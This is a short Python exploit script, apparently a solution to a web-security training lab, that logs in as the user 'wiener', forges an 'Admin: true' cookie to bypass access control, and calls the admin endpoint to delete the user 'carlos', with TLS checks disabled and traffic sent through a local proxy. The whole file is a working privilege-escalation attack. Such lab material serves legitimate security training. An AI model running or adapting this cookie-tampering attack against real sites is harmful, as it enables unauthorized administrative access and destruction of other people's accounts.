import requests as rs
import sys
import urllib3
from bs4 import BeautifulSoup as bs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = bs(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]
    # print(csrf) # if you want print csrf token in your terminal uncomment this
    return csrf


def delete_carlos_url(s, url):
    # get csrf token from the login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # login as wiener user
    data = {"csrf": csrf_token, "username": "wiener", "password": "peter"}

    r = s.post(login_url, data=data, verify=False, proxies=proxies)

    resp = r.text
    if "Log out" in resp:
        sys.stdout.write("Sucessfull login as wiener user\n")

        # Retrieve session cookie
        session_cookie = r.cookies.get_dict().get("session")

        # visit the admin panel  for delete user carlos
        delete_carlos_user_url = url + "/admin/delete?username=carlos"
        cookies = {"session": session_cookie, "Admin": "true"}
        r = rs.get(
            delete_carlos_user_url, cookies=cookies, verify=False, proxies=proxies
        )

        if r.status_code == 200:
            sys.stdout.write("[+] Successfully Delete Carlos User.")
        else:
            sys.stdout.write("[-] Failed To Delete Carlos User..")
            sys.exit(-1)

    else:
        sys.stdout.write("[*] Failed To Login As Weiner...")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        sys.stdout.write("[+] Usage %s <url>" % sys.argv[0])
        sys.exit(-1)

    s = rs.Session()
    url = sys.argv[1]
    delete_carlos_url(s, url)


if __name__ == "__main__":
    main()
